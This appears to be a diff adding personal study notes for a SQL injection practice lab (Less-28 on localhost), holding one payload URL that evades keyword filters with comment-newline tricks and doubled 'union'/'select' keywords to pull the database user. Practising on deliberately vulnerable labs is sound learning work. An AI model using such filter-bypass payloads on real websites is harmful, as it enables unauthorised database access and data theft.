@@ -1,0 +1,6 @@
+http://127.0.0.1/sql/Less-28/?id=25%27)/*%0A*/union/*%0A*/%20unIon/*%0A*/select%20select/*%0A*/1,user(),1/*%0A*/%20or%20(%271%27)=(%272
+
+union union => union //2 unions to one union
+
+') >>> enclosed under
+
